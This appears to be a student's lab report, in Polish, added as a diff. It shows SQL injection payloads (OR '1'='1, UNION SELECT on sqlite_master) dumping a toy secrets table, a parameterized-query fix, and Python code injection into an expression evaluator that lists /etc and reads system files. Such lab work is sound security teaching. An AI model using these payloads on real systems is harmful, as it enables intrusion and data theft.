@@ -1,0 +1,75 @@
+Zadanie 1
+1.1
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '1234'
+Liczba wierszy: 1
+
+anna: Hello world
+1.2
+Kumunikat błędu przy wpisaniu apostrofa
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '''
+OperationalError: unrecognized token: "'''"
+
+stało się tak ponieważ nasze zapytanie ma 3 apostrofy 
+czyli jeden pusty tekst i jeden nie zamknięty tekst co powosuje błąd.
+
+1.3
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' OR '1'='1'
+Liczba wierszy: 4
+
+anna: Hello world
+piotr: Top secret
+muszkieter: Jeden za wszystkich
+admin: Szyfr do sejfu: 7319 (fikcyjny)
+
+1.4
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --'
+Liczba wierszy: 2
+
+konta: CREATE TABLE konta(login TEXT, rola TEXT, email TEXT)
+sekrety: CREATE TABLE sekrety(klucz TEXT, wlasciciel TEXT, sekret TEXT)
+
+Zawartość tabeli konta: 
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT login, rola FROM konta --'
+Liczba wierszy: 2
+
+admin: administrator
+anna: użytkownik
+
+na początku jest dopisany apostrof który kończy napis i potem jest UNION który pozwala na zrobienie zapytania SQL
+ w naszym przypadku jest to SELECT.
+
+
+Zadanie 2
+Liczba wierszy:	Przed	 Po
+1234	1	1
+apostrof	błąd	0
+' OR '1'='1	4	0
+UNION SELECT….	2	0
+d'Artagnan	błąd	1
+
+zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?"
+wiersze, blad = [], None
+try:
+    with sqlite3.connect(BAZA, uri=True) as db:
+        wiersze = db.execute(zapytanie,(klucz,)).fetchall()
+w zapytnie zamieniłem klucz na znak zapytania, i dałem go jako argument do db.execute dzięki temu 
+to co wpisze użtykownik, traktowane jest jako pojedyńczy tekst i nie może zmienić struktury zapytania, nie może zmienić nazwy tabeli z tego samego powodu.
+
+
+Zadanie 3
+Wyrażenie 
+__import__('os').listdir('/etc')
+ Oblicz
+Wynik: ['sysctl.d', 'mtab', 'group', 'apk', 'periodic', 'udhcpc', 'sysctl.conf', 'issue', 'inittab', 'secfixes.d', 'hostname', 'nsswitch.conf', 'busybox-paths.d', 'modules', 'os-release', 'shadow', 'profile', 'modprobe.d', 'alpine-release', 'ssl1.1', 'profile.d', 'logrotate.d', 'shells', 'network', 'modules-load.d', 'opt', 'fstab', 'passwd', 'hosts', 'protocols', 'securetty', 'services', 'motd', 'crontabs', 'ssl', 'resolv.conf', 'group-', 'passwd-', 'shadow-', 'netconfig', 'krb5.conf', 'inputrc', 'terminfo', 'bindresvport.blacklist', 'ca-certificates', 'ca-certificates.conf']
+
+
+Wyrażenie 
+open('/etc/os-release').read()
+ Oblicz
+Wynik: NAME="Alpine Linux" ID=alpine VERSION_ID=3.24.4 PRETTY_NAME="Alpine Linux v3.24" HOME_URL="https://alpinelinux.org/" BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
+
+
+
+
+
+
